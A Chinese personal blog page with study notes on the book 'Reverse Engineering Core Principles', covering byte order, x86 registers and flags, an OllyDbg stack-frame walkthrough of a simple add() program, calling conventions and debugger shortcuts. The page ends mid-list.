<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Here recording my growth of technology and hope you can gain something here."><meta name="keywords" content=""><meta name="author" content="George"><meta name="copyright" content="George"><title>Welcome to my blog. | A.</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">96</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/">逆向工程核心原理</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-22</time><div class="content"><h1 id="小端序和大端序"><a href="#小端序和大端序" class="headerlink" title="小端序和大端序"></a>小端序和大端序</h1><p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1-1.jpg" alt="1-1"></p>
<p>大端序【更直观】：数据的低位存储在地址的高位。</p>
<p>小端序【符合人类思维】：数据的低位存储在地址的低位。【Intel X86 CPU】</p>
<blockquote>
<p>注：对于char[]字符串，字符数组在内存中是连续的，所以无论大端序还是小端序，存储顺序都是相同的。</p>
</blockquote>
<p>用以上数据做一个测试，拖进ollydbg：</p>
<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1-2.png" alt="1-2"></p>
<p>可以发现这里使用的是小端序。</p>
<h1 id="IA-32寄存器【p36】"><a href="#IA-32寄存器【p36】" class="headerlink" title="IA-32寄存器【p36】"></a>IA-32寄存器【p36】</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>EAX：【针对操作数和结果数据】累加器</p>
<blockquote>
<p>EAX(0-31)：32位</p>
<p>AX(0-15)：16位</p>
<p>AH(8-15)：8位</p>
<p>AL(0-7)：8位</p>
</blockquote>
<p>EBX：【DS段的数据指针】基址寄存器</p>
<p>ECX：【字符串和循环操作】计数器</p>
<p>EDX：【I/O指针】数据寄存器</p>
<p>EBP：扩展基址寄存器</p>
<p>ESI：源变址寄存器</p>
<p>EDI：目的变址寄存器</p>
<p>ESP：栈指针寄存器</p>
<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>CS：代码段寄存器</p>
<p>SS：栈段寄存器</p>
<p>DS：数据段寄存器</p>
<p>ES：附加（数据）段寄存器</p>
<p>FS：数据段寄存器</p>
<p>GS：数据段寄存器</p>
<h2 id="程序状态与控制寄存器"><a href="#程序状态与控制寄存器" class="headerlink" title="程序状态与控制寄存器"></a>程序状态与控制寄存器</h2><h3 id="EFLAGS：标志寄存器"><a href="#EFLAGS：标志寄存器" class="headerlink" title="EFLAGS：标志寄存器"></a>EFLAGS：标志寄存器</h3><p>ZF：零标志【运算结果为0，该位为1】</p>
<p>OF：溢出标志【有符号整数溢出时为1/MSB（Most SIgnificant Bit 最高有效位）改变时为1】</p>
<p>CF：进位标志【无符号整数溢出时为1】</p>
<blockquote>
<p>PF（parity flag）：奇偶标志位。这个位的判断需要我们将结果转为二进制来看，如果结果的低8位中有偶数个1，就将PF的值置1；如果是奇数个1，就置0。要注意的是一定是结果的低8位。</p>
<p>AF（auxiliary flag）：辅助进位标志位。这个位用的不多，所以书上也没有讲，我就简单的查了一下资料。这个位表示加减法做到一半时有没有形成进位/借位，如果有则AF=1。这么说谁都听不懂，所以我们举个例子来说下。例如 MOV AL,00001110 MOV BL,00001000 ADD AL,BL 最后结果为AL=00010110这就是低四位向高四位进位。反之在减法中第三位不够减向第四位借位(注意数位是从第0位开始数的)叫低四位向高四位借位!像前面的AL中前四位为高四位,后四位为低四位。例如,当两个字节相加时,如果从低4位向高4位有进位时,则AF=1。</p>
<p>ZF（zero flag）：零标志位。这个位就很简单了，判断结果是不是0。如果结果为0，就置1；不为0，就置0。</p>
<p>SF（sign flag）：符号标志位。既然是符号标志位，就是对有符号数据来说的。如果结果为负，就置1；结果为正，就置0。</p>
<p>TF（timer overblow flag）：定时器溢出标志。这个位主要是用来在debug中进行-t指令时使用的。当cpu在执行完一条指令后，如果检测到TF位的值为1，则产生单步中断，引发中断过程。通过这个位，我们就可以在debug中对程序进行单步跟踪。</p>
<p>IF（interrupt flag）：中断允许标志位。当IF=1时，cpu在执行完当前指令后响应中断，引发中断过程；当IF=0时，则不响应可屏蔽中断。</p>
<p>DF（direction flag）：<strong>方向标志位</strong>。在串处理指令中，控制每次操作后，si（指向原始偏移地址）、di（指向目标偏移地址）的增减。当DF=0时，每次操作后，si、di递增；DF=1时，每次操作后，si、di递减。我们可以使用cld指令将DF的值置为0，使用std指令将DF的值置为1。DF需要与rep、movsb等指令配合使用。</p>
<p>OF（overflow flag）：溢出标志位。这个位是用来判断有没有溢出的。注意溢出这个概念只对于有符号数据而言，就如同进位只对于无符号数据而言。当OF=0时，说明没有溢出；当OF=1时，说明溢出了。</p>
</blockquote>
<h2 id="指令寄存器"><a href="#指令寄存器" class="headerlink" title="指令寄存器"></a>指令寄存器</h2><p>EIP【Instruction Pointer】：CPU每执行完一条指令，就通过EIP寄存器读取并执行下一条命令。</p>
<h1 id="对一个简单程序的栈帧分析"><a href="#对一个简单程序的栈帧分析" class="headerlink" title="对一个简单程序的栈帧分析"></a>对一个简单程序的栈帧分析</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">add</span><span class="params">(<span class="keyword">long</span> a, <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> x = a, y = b;</span><br><span class="line">    <span class="keyword">return</span> (x + y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, add(a, b));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在栈中，EBP作为栈底，ESP作为栈顶，EIP为指令指针。</p>
<p>刚开始的寄存器和栈是这样的：</p>
<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-1.png" alt="2-1"></p>
<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-2.png" alt="2-2"></p>
<p>1.从入口main函数进去，先配置好栈底和栈顶指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push EBP</span><br><span class="line">mov EBP,ESP</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此时，可以在栈窗口这样设置相对地址</p>
<p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/2-3.png" alt="2-3"></p>
</blockquote>
<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th>内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF28</td>
<td>EBP</td>
<td>0019FF70【执行main函数前EBP的地址】</td>
<td>EBP，ESP</td>
</tr>
</tbody></table>
<p>2.将栈顶向地址小的地方移动8个字节，来给main函数里的a，b变量分配空间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUB ESP,8</span><br></pre></td></tr></table></figure>

<p>然后赋值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">long a &#x3D; 1, b &#x3D; 2;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV DWORD PTR SS:[EBP-4],1			&#x2F;&#x2F;a</span><br><span class="line">MOV DWORD PTR SS:[EBP-8],2			&#x2F;&#x2F;b</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th>内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF20</td>
<td>EBP-8</td>
<td>2</td>
<td>ESP</td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP-4</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP</td>
<td>0019FF70【执行main函数前EBP的地址】</td>
<td>EBP</td>
</tr>
</tbody></table>
<p>3.调用add(a,b)函数，首先要传递参数a和b，这里是使用了EAX和ECX寄存器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,DWORD PTR SS:[EBP-8]</span><br><span class="line">PUSH EAX                                 ; Arg2 &#x3D;&gt; 2</span><br><span class="line">MOV ECX,DWORD PTR SS:[EBP-4]             </span><br><span class="line">PUSH ECX                                 ; Arg1 &#x3D;&gt; 1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ps：这里先压入了b，再压入a,遵循从右向左压入函数的规则</p>
</blockquote>
<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th>内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF18</td>
<td>EBP-10</td>
<td>1</td>
<td>ESP</td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP-C</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP-8</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP-4</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP</td>
<td>0019FF70【执行main函数前EBP的地址】</td>
<td>EBP</td>
</tr>
</tbody></table>
<p>4.用CALL调用的add函数，调用的同时会把返回地址压入栈中，返回地址指的是CALL语句的下一条语句。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040103C    CALL 00401000</span><br><span class="line">00401041    ADD ESP,8			&#x2F;&#x2F;call的下一句【非调用内容】</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th>内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF14</td>
<td>EBP-14</td>
<td>00401041【call线性关系上的下一条语句】</td>
<td>ESP</td>
</tr>
<tr>
<td>0019FF18</td>
<td>EBP-10</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP-C</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP-8</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP-4</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP</td>
<td>0019FF70【执行main函数前EBP的地址】</td>
<td>EBP</td>
</tr>
</tbody></table>
<p>5.将执行main函数时EBP值压入栈，并新生成执行add函数时的栈帧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP</span><br><span class="line">MOV EBP,ESP</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th>内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF10</td>
<td>EBP</td>
<td>0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
<td>EBP，ESP</td>
</tr>
<tr>
<td>0019FF14</td>
<td>EBP+4</td>
<td>00401041【call线性关系上的下一条语句】</td>
<td></td>
</tr>
<tr>
<td>0019FF18</td>
<td>EBP+8</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP+C</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP+10</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP+14</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP+18</td>
<td>0019FF70【执行main函数前EBP的地址】</td>
<td></td>
</tr>
</tbody></table>
<p>6.先分配8个字节给两个long类型变量x和y，再将参数a，b的值分别赋给它们。【因为push参数时是从右往左，那么调用时先调用靠近栈顶的元素代表从左往右调用】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">long x&#x3D;a,y&#x3D;b;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401003  SUB ESP,8</span><br><span class="line">00401006  MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">00401009  MOV DWORD PTR SS:[EBP-8],EAX</span><br><span class="line">0040100C  MOV ECX,DWORD PTR SS:[EBP+0C]</span><br><span class="line">0040100F  MOV DWORD PTR SS:[EBP-4],ECX</span><br><span class="line">&#x2F;&#x2F;EAX&#x3D;1，ECX&#x3D;2</span><br><span class="line">&#x2F;&#x2F;赋值顺序似乎是按照传参的顺序，在栈中的顺序赋值和参数上下相同【EBP-8，EBP-4和EBP+8，EBP+0C】</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th align="left">内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF08</td>
<td>EBP-8</td>
<td align="left">1</td>
<td>ESP</td>
</tr>
<tr>
<td>0019FF0C</td>
<td>EBP-4</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF10</td>
<td>EBP</td>
<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
<td>EBP</td>
</tr>
<tr>
<td>0019FF14</td>
<td>EBP+4</td>
<td align="left">00401041【call线性关系上的下一条语句】</td>
<td></td>
</tr>
<tr>
<td>0019FF18</td>
<td>EBP+8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP+C</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP+10</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP+14</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP+18</td>
<td align="left">0019FF70【执行main函数前EBP的地址】</td>
<td></td>
</tr>
</tbody></table>
<p>6.计算x+y</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00401012  MOV EAX,DWORD PTR SS:[EBP-8]		&#x2F;&#x2F;先调用栈顶的</span><br><span class="line">00401015  ADD EAX,DWORD PTR SS:[EBP-4]</span><br><span class="line">&#x2F;&#x2F;EAX&#x3D;x+y&#x3D;1+2&#x3D;3</span><br></pre></td></tr></table></figure>



<p>7.将ESP指向EBP的地址，即从这时开始，局部变量x和y将不再有效</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401018  MOV ESP,EBP</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th align="left">内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF08</td>
<td>EBP-8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF0C</td>
<td>EBP-4</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF10</td>
<td>EBP</td>
<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
<td>EBP，ESP</td>
</tr>
<tr>
<td>0019FF14</td>
<td>EBP+4</td>
<td align="left">00401041【call线性关系上的下一条语句】</td>
<td></td>
</tr>
<tr>
<td>0019FF18</td>
<td>EBP+8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP+C</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP+10</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP+14</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP+18</td>
<td align="left">0019FF70【执行main函数前EBP的地址】</td>
<td></td>
</tr>
</tbody></table>
<p>8.弹出栈顶元素【main函数的EBP地址】并且赋值给EBP，此时就完全删除了栈帧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP EBP</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th align="left">内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF08</td>
<td>EBP-8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF0C</td>
<td>EBP-4</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF10</td>
<td>EBP</td>
<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
<td></td>
</tr>
<tr>
<td>0019FF14</td>
<td>EBP+4</td>
<td align="left">00401041【call线性关系上的下一条语句】</td>
<td>ESP</td>
</tr>
<tr>
<td>0019FF18</td>
<td>EBP+8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP+C</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP+10</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP+14</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP+18</td>
<td align="left">0019FF70【执行main函数前EBP的地址】</td>
<td>EBP</td>
</tr>
</tbody></table>
<p>9.RETN相当于弹出栈顶的地址，并JMP过去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RETN</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th align="left">内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF08</td>
<td>EBP-8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF0C</td>
<td>EBP-4</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF10</td>
<td>EBP</td>
<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
<td></td>
</tr>
<tr>
<td>0019FF14</td>
<td>EBP+4</td>
<td align="left">00401041【call线性关系上的下一条语句】</td>
<td></td>
</tr>
<tr>
<td>0019FF18</td>
<td>EBP+8</td>
<td align="left">1</td>
<td>ESP</td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP+C</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP+10</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP+14</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP+18</td>
<td align="left">0019FF70【执行main函数前EBP的地址】</td>
<td>EBP</td>
</tr>
</tbody></table>
<blockquote>
<p>此时EIP就是00401041</p>
</blockquote>
<p>10.由于add函数已经调用结束，也就不需要参数a和b了，所以将它们清理掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD ESP，8</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th align="left">内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF08</td>
<td>EBP-8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF0C</td>
<td>EBP-4</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF10</td>
<td>EBP</td>
<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
<td></td>
</tr>
<tr>
<td>0019FF14</td>
<td>EBP+4</td>
<td align="left">00401041【call线性关系上的下一条语句】</td>
<td></td>
</tr>
<tr>
<td>0019FF18</td>
<td>EBP+8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP+C</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP+10</td>
<td align="left">2</td>
<td>ESP</td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP+14</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP+18</td>
<td align="left">0019FF70【执行main函数前EBP的地址】</td>
<td>EBP</td>
</tr>
</tbody></table>
<p>11.调用printf()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00401044  PUSH EAX</span><br><span class="line">00401045  PUSH OFFSET 0040B384                     ; ASCII &quot;%d</span><br><span class="line">0040104A  CALL 00401067</span><br><span class="line">0040104F  ADD ESP,8</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%d\n&quot;,add(a,b));</span><br></pre></td></tr></table></figure>

<p>printf有两个参数，一个是”%d\n”，另一个是add(a,b)的返回值。</p>
<p>所以从右往左依次压入这些参数，随后调用。</p>
<p>调用完成后，按规矩清理这两个参数。</p>
<p>最后栈变成这样：</p>
<table>
<thead>
<tr>
<th>绝对地址</th>
<th>相对地址</th>
<th align="left">内容</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>0019FF08</td>
<td>EBP-8</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF0C</td>
<td>EBP-4</td>
<td align="left">2</td>
<td></td>
</tr>
<tr>
<td>0019FF10</td>
<td>EBP</td>
<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
<td></td>
</tr>
<tr>
<td>0019FF14</td>
<td>EBP+4</td>
<td align="left">00401041【call线性关系上的下一条语句】</td>
<td></td>
</tr>
<tr>
<td>0019FF18</td>
<td>EBP+8</td>
<td align="left">0040B384</td>
<td></td>
</tr>
<tr>
<td>0019FF1C</td>
<td>EBP+C</td>
<td align="left">3</td>
<td></td>
</tr>
<tr>
<td>0019FF20</td>
<td>EBP+10</td>
<td align="left">2</td>
<td>ESP</td>
</tr>
<tr>
<td>0019FF24</td>
<td>EBP+14</td>
<td align="left">1</td>
<td></td>
</tr>
<tr>
<td>0019FF28</td>
<td>EBP+18</td>
<td align="left">0019FF70【执行main函数前EBP的地址】</td>
<td>EBP</td>
</tr>
</tbody></table>
<p>12.设置返回值0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return 0;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XOR EAX，EAX</span><br></pre></td></tr></table></figure>

<blockquote>
<p>为什么不用<code>MOV EAX，0</code>？</p>
<p>XOR EAX，EAX执行速度快一些</p>
</blockquote>
<p>13.删除main函数的栈帧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV ESP，EBP</span><br><span class="line">POP EBP</span><br></pre></td></tr></table></figure>

<p>之后EBP又指向执行main函数之前EBP地址，一切恢复如初。</p>
<h1 id="三种函数调用方式"><a href="#三种函数调用方式" class="headerlink" title="三种函数调用方式"></a>三种函数调用方式</h1><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h2><ol>
<li><p>函数的参数以逆序压入栈【从右向左】</p>
</li>
<li><p>调用函数RETN后，在调用者函数中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD ESP，n</span><br></pre></td></tr></table></figure>

<p>来清理栈</p>
</li>
</ol>
<h2 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h2><ol>
<li><p>清理栈的任务交给了被调用者函数，在函数返回时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RETN 8		&#x2F;&#x2F;RETN+POP 8字节</span><br></pre></td></tr></table></figure>
</li>
<li><p>这种调用方法<strong>兼容性</strong>更好</p>
</li>
</ol>
<h2 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h2><p>正如名字所描述的fast，fastcall通常使用寄存器而非栈内存传递参数，因为访问寄存器通常会快很多。</p>
<p>但当需要备份、程序复杂时，也不一定就快。</p>
<h1 id="操作技巧"><a href="#操作技巧" class="headerlink" title="操作技巧"></a>操作技巧</h1><h2 id="Ollydbg"><a href="#Ollydbg" class="headerlink" title="Ollydbg"></a>Ollydbg</h2><h3 id="保存打完补丁的文件"><a href="#保存打完补丁的文件" class="headerlink" title="保存打完补丁的文件"></a>保存打完补丁的文件</h3><ol>
<li><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-1.png" alt="0-1"></li>
<li>在新跳出的页面<img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-2.png" alt="0-2"></li>
<li>在栈里面跳转到内存地址<img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-3.png" alt="0-3"></li>
</ol>
<h3 id="一些操作快捷键"><a href="#一些操作快捷键" class="headerlink" title="一些操作快捷键"></a>一些操作快捷键</h3><p>F7（Step into）：单步执行，有CALL时进入函数</p>
<p>F8（Step Over）：单步执行，有CALL时不进入CALL的地址</p>
<p>Ctrl + G（Go to）：转到指定地址</p>
<p>F2：设置断点</p>
<p>F9：运行程序到断点处</p>
<h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><ol>
